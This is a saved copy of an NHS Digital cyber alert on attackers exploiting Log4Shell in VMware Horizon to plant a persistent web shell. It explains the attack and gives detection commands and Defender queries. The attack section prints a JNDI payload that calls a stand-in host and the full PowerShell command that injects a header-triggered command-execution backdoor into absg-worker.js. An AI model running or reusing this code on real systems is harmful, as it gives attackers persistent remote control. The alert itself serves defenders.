<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://digital.nhs.uk/cyber-alerts/2022/cc-4002">Original</a>
    <h1>Log4Shell Vulnerabilities in VMware Horizon Targeted to Install Web Shells</h1>
    
    <div id="readability-page-1" class="page"><div id="threat-details">
                        <p>Threat details</p>


        <div id="introduction">
            
            <h2 data-uipath="website.contentblock.section.title">
Introduction
            </h2>
            <div data-uipath="website.contentblock.section.content">
<p>An unknown threat group has been observed targeting VMware Horizon servers running versions affected by <a rel="noopener noreferrer" href="https://digital.nhs.uk/cyber-alerts/2021/cc-3989" target="_blank" onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;CyberAlert&#39;,&#39;https://digital.nhs.uk/cyber-alerts/2021/cc-3989&#39;);" onkeyup="return vjsu.onKeyUp(event)">Log4Shell vulnerabilities</a> in order to establish persistence within affected networks.</p>

<p>The attack likely consists of a reconnaissance phase, where the attacker uses the<strong> </strong>Java Naming and Directory Interface<sup>TM</sup> (JNDI) via Log4Shell payloads to call back to malicious infrastructure.</p>

<p>Once a weakness has been identified, the attack then uses the Lightweight Directory Access Protocol (LDAP) to retrieve and execute a malicious Java class file that injects a web shell into the VM Blast Secure Gateway service.</p>

<p>The web shell can then be used by an attacker to carry out a number of malicious activities such as deploying additional malicious software, <a rel="noopener noreferrer" href="https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#exfiltration" target="_blank" onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;CyberAlert&#39;,&#39;https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#exfiltration&#39;);" onkeyup="return vjsu.onKeyUp(event)">data exfiltration</a>, or deployment of <a rel="noopener noreferrer" href="https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#ransomware" target="_blank" onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;CyberAlert&#39;,&#39;https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#ransomware&#39;);" onkeyup="return vjsu.onKeyUp(event)">ransomware</a>.</p>            </div>
        </div>



    <div aria-labelledby="emphasis-important-b72ca48d">
        <div>


            <div>

                    <p role="heading" id="emphasis-important-b72ca48d" data-uipath="website.contentblock.emphasis.heading">NHS Digital response to Log4Shell</p>

                    <div data-uipath="website.contentblock.emphasis.content"><p>This alert is part of NHS Digital&#39;s wider response to the Log4Shell remote code execution vulnerability. For more information on Log4Shell itself, please visit our cyber alerts article <a rel="noopener noreferrer" href="http://digital.nhs.uk/cyber-alerts/2021/cc-3989" target="_blank" onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;CyberAlert&#39;,&#39;http://digital.nhs.uk/cyber-alerts/2021/cc-3989&#39;);" onkeyup="return vjsu.onKeyUp(event)">Log4Shell RCE Vulnerability CC-3989</a>.</p>

<p>Additional VMware systems may be vulnerable and affected organisations should regularly review the <a rel="noopener noreferrer" href="http://www.vmware.com/security/advisories/VMSA-2021-0028.html" target="_blank" onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;CyberAlert&#39;,&#39;http://www.vmware.com/security/advisories/VMSA-2021-0028.html&#39;);" onkeyup="return vjsu.onKeyUp(event)">VMSA-2021-0028</a> security advisory: VMware Response to Apache Log4j Remote Code Execution Vulnerability.  NHS and social care organisations are invited to use the <a rel="noopener noreferrer" href="http://digital.nhs.uk/cyber-and-data-security/about-us/cyber-associates-network" target="_blank" onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;CyberAlert&#39;,&#39;http://digital.nhs.uk/cyber-and-data-security/about-us/cyber-associates-network&#39;);" onkeyup="return vjsu.onKeyUp(event)">Cyber Associates Network</a> to find out additional information and participate in discussion about the Log4Shell remote code execution vulnerability and affected VM products.</p></div>
                
            </div>
        </div>
    </div>

        <div id="attack-details">
            
            <h2 data-uipath="website.contentblock.section.title">
Attack details
            </h2>
            <div data-uipath="website.contentblock.section.content">
<p>The attack is very likely initiated via a Log4Shell payload similar to ${jndi:ldap://example.com}. The attack exploits the Log4Shell vulnerability in the Apache Tomcat service which is embedded within VMware Horizon. This then launches the following PowerShell command, spawned from <em>ws_TomcatService.exe</em>:</p>

<p><span><picture><img src="https://nhs-prod.global.ssl.fastly.net/binaries/content/gallery/website/cyber-alerts/cc-4002/powershell.png" alt="Malicious PowerShell script"/></picture></span></p>

<p><span>powershell -c &#34;$path=gwmi win32_service|?{$.Name -like &#34;&#34;&#34;VMBlastSG&#34;&#34;&#34;}|%{$.PathName -replace &#39;&#34;&#34;&#34;&#39;, &#39;&#39; -replace &#34;&#34;&#34;nssm.exe&#34;&#34;&#34;,&#34;&#34;&#34;lib\absg-worker.js&#34;&#34;&#34;}</span>;</p>

<p>The executed command invokes <em>Get-WMIObject</em> on <em>win32_service</em>, returning a list of service names containing &#39;VMBlastSG&#39;. It identifies the file path for the service, replaces instances of &#39;nssm.exe&#39; with &#39;lib/absg-worker.js&#39; and writes this path to $path, thereby identifying the location of the &#39;absg-worker.js&#39; file for the targeted VMware Horizon instance.</p>

<p><span>$expr=&#34;&#34;&#34;req.connection.end(); </span></p>

<p><span>if(String(req.url).includes(&#39;REDACTED&#39;)) {try {replyError(req, res, 200, require(&#39;child_process&#39;).execSync(Buffer.from(req.headers[&#39;data&#39;], &#39;base64&#39;).toString(&#39;ascii&#39;)`r`n`t`t`t`t`t).toString());</span></p>

<p><span>catch (err) {replyError(req, res, 400, err.stderr.toString());</span></p>

<p><span>return;&#34;&#34;&#34;;</span></p>

<p>This writes a code block to $expr that listens for any web requests containing a specific, hardcoded string in the URI before executing arbitrary commands contained in the &#39;data&#39; header object. The output is delivered to the attacker via &#39;replyError&#39; where requests contained the specified string, otherwise a standard error message is returned.</p>

<p><span>(Get-Content $path)|ForEach-Object {$_ -replace &#34;&#34;&#34;req.connection.end()\;&#34;&#34;&#34;, $expr}|Set-Content $path;Restart-Service -Force VMBlastSG&#34;</span></p>

<p>Retrieves the list of service path names stored in $path and for each replaces any instances of &#34;req.connection.end()\;&#34; with the code block stored in $expr described above, thereby injecting the web shell. The altered &#39;absg-worker.js&#39; file then contains:</p>

<p><span><picture><img src="https://nhs-prod.global.ssl.fastly.net/binaries/content/gallery/website/cyber-alerts/cc-4002/articleimage_codeblock.png" alt="codeblock"/></picture></span></p>

<p>The &#39;VMBLastSG&#39; service is then forcibly restarted to initiate the listener.</p>

<p>Once established, the listener will execute arbitrary commands received in crafted web (HTTP / HTTPS) requests if a particular hardcoded string (key) is present in the URI of the request. The commands are stored as a header object (named &#39;data&#39;) in the crafted requests. This process is used to establish persistent communication with a <a rel="noopener noreferrer" href="https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#command-and-control-server" target="_blank" onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;CyberAlert&#39;,&#39;https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#command-and-control-server&#39;);" onkeyup="return vjsu.onKeyUp(event)">command and control server</a> that could then be used to carry out other malicious activities such as deploying additional malicious software, <a rel="noopener noreferrer" href="https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#exfiltration" target="_blank" onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;CyberAlert&#39;,&#39;https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#exfiltration&#39;);" onkeyup="return vjsu.onKeyUp(event)">data exfiltration</a>, or deployment of <a rel="noopener noreferrer" href="https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#ransomware" target="_blank" onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;CyberAlert&#39;,&#39;https://digital.nhs.uk/cyber-and-data-security/about-us/cyber-security-glossary#ransomware&#39;);" onkeyup="return vjsu.onKeyUp(event)">ransomware</a>.</p>

<p>A representative diagram of the attack is provided below:</p>

<p><span><picture><img src="https://nhs-prod.global.ssl.fastly.net/binaries/content/gallery/website/cyber-alerts/cc-4002/attacker-diagram.png" alt="Process diagram of malicious attack"/></picture></span></p>            </div>
        </div>
    <div>
        <div>
            <details>
                <summary aria-label="Image description">
                    
                </summary>

                <div>
<ol>
 <li>Log4Shell payload queries VMware Horizon server.</li>
 <li>Horizon server calls back over LDAP protocol and pulls malicious Java class.</li>
 <li>Malicious Java class executes PowerShell script, spawned from VMware Horizon&#39;s <em>ws_tomcatService.exe</em></li>
 <li>PowerShell script injects a web shell to <em>absg-worker.js</em>, and restarts <em>VMBlastSG</em> service.</li>
 <li>Listener created using Blast Secure Gateway for any IP address on port 8443.</li>
 <li>Stealthy persistence method established. Awaiting presence of specific key in attacker-invoked URI.</li>
</ol>                </div>
            </details>
        </div>
    </div>

        <div id="threat-hunting-advice">
            <hr/>
            <h2 data-uipath="website.contentblock.section.title">
Threat Hunting Advice
            </h2>
            <div data-uipath="website.contentblock.section.content">
<p>Organisations should look for the following:</p>

<ul>
 <li>Evidence of <em>ws_TomcatService.exe</em> spawning abnormal processes</li>
 <li>Any <em>powershell.exe</em> processes containing ‘VMBlastSG’ in the commandline</li>
 <li>File modifications to ‘…\VMware\VMware View\Server\appblastgateway\lib\absg-worker.js’ - This file is generally overwritten during upgrades, and not modified</li>
</ul>

<p>Any organisations that detect anomalous activity fitting the above patterns should contact CSOC via <a onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;Cyber alert&#39;,&#39;tel:004403003035222&#39;);" href="tel:004403003035222" title="Contact us by telephone" onkeyup="return vjsu.onKeyUp(event)">0300 303 5222 </a>or email <a onclick="logGoogleAnalyticsEvent(&#39;Link click&#39;,&#39;Cyber alert&#39;,&#39;mailto:carecert@nhsdigital.nhs.uk&#39;);" href="mailto:carecert@nhsdigital.nhs.uk" title="Report a cyber attack" onkeyup="return vjsu.onKeyUp(event)">carecert@nhsdigital.nhs.uk</a></p>            </div>
        </div>

        <h3 data-uipath="website.contentblock.codesection.title">PowerShell command to detect file modification</h3>

    <article>
        <div>
            <div>
                <div id="PowerShell-content" role="tabpanel" aria-labelledby="tab-PowerShell-content">
                    <pre><span><span></span><code><span>$path</span>=gwmi win32_service|?{<span>$_</span>.Name <span>-like</span> <span>&#34;*VMBlastSG*&#34;</span>}|%{<span>$_</span>.PathName <span>-replace</span> <span>&#34;nssm.exe&#34;</span>,<span>&#34;lib\absg-worker.js&#34;</span>;gc <span>$path</span>|<span>Select-String</span> <span>&#34;req.headers\[\&#39;data\&#39;\]&#34;</span></code></span>
</pre>
                </div>
            </div>
        </div>
        
    </article>

        <h3 data-uipath="website.contentblock.codesection.title">Microsoft Defender for Endpoint query to detect abnormal child processes spawned by ws_TomcatService.exe</h3>

    <article>
        <div>
            <div>
                <div id="KQL-content" role="tabpanel" aria-labelledby="tab-KQL-content">
                    <pre><span><span></span><code>DeviceProcessEvents
</code></span>
<span><span></span><code>| <span>where</span> InitiatingProcessFileName =~ <span>&#34;ws_TomcatService.exe&#34;</span>
</code></span>
<span><span></span><code>| <span>where</span> FileName != <span>&#34;repadmin.exe&#34;</span></code></span>
</pre>
                </div>
            </div>
        </div>
        
    </article>

        <h3 data-uipath="website.contentblock.codesection.title">Microsoft Defender for Endpoint query to detect powershell.exe processes with &#39;VMBlastSG&#39; in the command line</h3>

    <article>
        <div>
            <div>
                <div id="KQL-content" role="tabpanel" aria-labelledby="tab-KQL-content">
                    <pre><span><span></span><code>DeviceProcessEvents
</code></span>
<span><span></span><code>| <span>where</span> FileName =~ <span>&#34;powershell.exe&#34;</span>
</code></span>
<span><span></span><code>| <span>where</span> ProcessCommandLine has <span>&#34;VMBlastSG&#34;</span></code></span>
</pre>
                </div>
            </div>
        </div>
        
    </article>
                    </div></div>
  </body>
</html>
